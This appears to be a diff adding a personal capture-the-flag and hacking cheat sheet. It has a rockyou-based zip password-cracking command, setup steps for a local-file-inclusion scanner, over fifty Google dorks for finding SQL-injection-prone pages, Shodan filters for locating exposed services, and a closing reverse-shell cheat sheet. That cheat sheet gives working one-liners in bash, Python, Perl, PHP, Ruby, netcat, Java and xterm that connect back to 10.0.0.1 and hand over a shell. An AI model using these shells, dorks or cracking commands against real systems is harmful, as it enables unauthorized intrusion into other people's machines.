@@ -1,0 +1,134 @@
+Osint : https://instantusername.com
+Forensics : fcrackzip -u -D -p rockyou.txt flag.zip
+pick 5 character words: grep -E '^.{5}$' rockyou.txt > rock5.txt
+
+LFI Finder:
+git clone https://github.com/capture0x/LFI-FINDER/
+cd LFI-FINDER
+bash setup.sh
+pip3 install -r requirements.txt
+chmod -R 755 lfi.py
+python3 lfi.py
+
+pcapng to pcap:
+tshark -F pcap -r {pcapng file} -w {pcap file}
+find . -type f -name '*.pcapng' -print0 | while IFS= read -r -d '' f; do editcap -F libpcap "$f" "${f%.pcapng}.pcap"; done
+
+Dorks:
+50+ SQLI GoogleDorks 
+inurl:index.php?id=
+inurl:news.php?id=
+inurl:gallery.php?id=
+inurl:article.php?id=
+inurl:product.php?id=
+inurl:category.php?id=
+inurl:page.php?id=
+inurl:detail.php?id=
+inurl:show.php?id=
+inurl:content.php?id=
+inurl:shop.php?id=
+inurl:view.php?id=
+inurl:info.php?id=
+inurl:profile.php?id=
+inurl:item.php?id=
+inurl:event.php?id=
+inurl:download.php?id=
+inurl:board.php?id=
+inurl:login.php?id=
+inurl:checkout.php?id=
+inurl:search.php?id=
+inurl:buy.php?id=
+inurl:product_list.php?id=
+inurl:catalog.php?id=
+inurl:store.php?id=
+inurl:cart.php?id=
+inurl:product_detail.php?id=
+inurl:faq.php?id=
+inurl:feedback.php?id=
+inurl:vote.php?id=
+inurl:member.php?id=
+inurl:forum.php?id=
+inurl:profile_view.php?id=
+inurl:event_info.php?id=
+inurl:show_item.php?id=
+inurl:download_file.php?id=
+inurl:show_post.php?id=
+inurl:info_view.php?id=
+inurl:article_read.php?id=
+inurl:content_view.php?id=
+inurl:review.php?id=
+inurl:item_view.php?id=
+inurl:gallery_view.php?id=
+inurl:news_item.php?id=
+inurl:shop_view.php?id=
+1. org:"http://target. com" 
+2. http.status:"<status_code>" 
+3. product:"<Product_Name>" 
+4. port:<Port_Number> “Service_Message” 
+5. port:<Port_Number> “Service_Name” 
+6. http.component:"<Component_Name>" 
+7. http.component_category:"<Component_Category> 
+8. http.waf:"<firewall_name>" 
+9. http.html:"<Name>" 
+10. http.title:"<Title_Name>" 
+11. ssl.alpn:"<Protocol>" 
+12. http.favicon.hash:"<Favicon_Hash>" 
+13. net:"<Net_Range>" (for e.g. 104.16.100.52/32) 
+14. http://ssl.cert.subject.cn:"<http://Domain .com>" 
+15. asn:"<ASnumber>" 
+16. hostname:"<hosthame>" 
+17. ip:"<IP_Address>" 
+18. all:"<Keyword>" 
+19. “Set-Cookie: phpMyAdmin” 
+20. “Set-Cookie: lang=" 
+21. “Set-Cookie: PHPSESSID" 
+22. “Set-Cookie: webvpn” 
+23. “Set-Cookie:webvpnlogin=1" 
+24. “Set-Cookie:webvpnLang=en” 
+25. “Set-Cookie: mongo-express=" 
+26. “Set-Cookie: user_id=" 
+27. “Set-Cookie: phpMyAdmin=" 
+28. “Set-Cookie: _gitlab_session” 
+29. “X-elastic-product: Elasticsearch” 
+30. “x-drupal-cache” 
+31. “access-control-allow-origin” 
+32. “WWW-Authenticate”  
+33. “X-Magento-Cache-Debug”   
+34. “kbn-name: kibana”
+
+Bug Bounty Hunting Search Engine! Check Here: https://www.bugbountyhunting.com
+CVE-Engine  Website : http://nahid0x1.androidafe.tech/cve-engine/
+
+
+Reverse Shell Cheat Sheet:
+
+Bash;
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+Python;
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+PERL; 
+
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+PHP;
+
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+Ruby;
+
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+Netcat;
+
+nc -e /bin/sh 10.0.0.1 1234
+Java;
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+xterm;
+
+xterm -display 10.0.0.1:1
+
+
